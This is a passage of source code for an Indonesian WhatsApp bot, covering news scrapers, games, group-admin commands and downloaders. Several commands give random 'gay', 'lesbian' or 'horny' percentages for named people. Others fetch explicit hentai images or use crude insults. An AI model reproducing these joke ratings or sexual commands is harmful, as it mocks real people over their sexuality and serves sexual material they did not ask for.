haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'antara-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: hw })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: hw })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: hw })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
haikal.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: hw })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: hw })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: hw })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: hw })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: hw })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return reply (`Contoh : .wangy haikal`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 anjay(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
anjay(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) anjay(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return anjay(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return anjay(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await haikal.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) haikal.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6285714170944 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
}
break
//=================================================//
case 'sc': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
anjay('Telegram : https://t.me/haikal857\n\n Sc Bot : https://youtube.com/c/HwModsWa857')
}
break
//=================================================//
case 'chat': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
haikal.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unmute') {
haikal.chatModify({ mute: null }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'archive') {
haikal.chatModify({archive: true }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unarchive') {
haikal.chatModify({ archive: false }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'read') {
haikal.chatModify({ markRead: true }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'unread') {
haikal.chatModify({ markRead: false }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'delete') {
haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
}
break
//=================================================//
case 'family100': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if ('family100'+m.chat in _family100) {
anjay('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await haikal.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
anjay(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return  
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return anjay('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*HW MODS WA*`
anjay(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : hw }).catch ((err) => anjay('*Failed to download File*'))
}
break
//=================================================//
//=================================================//
//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
haikal.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
await haikal.groupLeave(m.chat).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
anjay(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => anjay(jsonformat(err)))
}
break
//=================================================//
case 'nsfw': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!isBotAdmins) return anjay(mess.botAdmin)
if (!isAdmins && !isCreator) return anjay(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return anjay('Sudah Aktif')
ntnsfw.push(from)
anjay('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
} else if (args[0] === "off") {
if (!AntiNsfw) return anjay('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
anjay('Sukses Mematikan Nsfw di group ini')
} else {
const anuu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*HELLO SANGEAN\n\n
trap
gasm
nwaifu
hneko `,
}
haikal.sendMessage(m.chat, anuu, `${global.botname}`, m)
}
}
break
case 'trap' :
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!AntiNsfw) return anjay(mess.nsfw)
anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 const trapbot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, trapbot, { quoted:hw }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!AntiNsfw) return anjay(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const hnekobot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, hnekobot, { quoted:hw }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!AntiNsfw) return anjay(mess.nsfw)
anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const nwaifubot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, nwaifubot, { quoted:hw }).catch(err => {
 return('Error!')
})
break
case 'gasm':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!AntiNsfw) return anjay(mess.nsfw)
anjay(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
 const wbuttsss = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
haikal.sendMessage(m.chat, wbuttsss,{ quoted:hw }).catch(err => {
 return('Error!')
})
break
case 'penjara':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
anjay(teks)
break
case 'setppbot': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var media = await haikal.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await haikal.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await haikal.updateProfilePicture(botNumber, { url: media }) }
anjay(mess.success)
} catch { anjay('Gagal Mengganti Photo Profile') }
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./baseikal/lib/myfunc")
var { img } = await generateProfilePicture(media)
await haikal.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await haikal.updateProfilePicture(m.chat, { url: media }) }
anjay(mess.success)
} catch { anjay('Gagal Mengganti Photo Profile') }
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: hw })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: hw })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
anjay(teks)
}
break
//=================================================//
//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => anjay(`Sukses Menutup Group`)).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => anjay(`Sukses Membuka Group`)).catch((err) => anjay(jsonformat(err)))
} else {
const anmu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Group`,
}
haikal.sendMessage(m.chat, anmu, `Mode Group`, haikal.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => anjay(`Sukses Membuka Edit Info Group`)).catch((err) => anjay(jsonformat(err)))
 } else if (args[0] === 'close'){
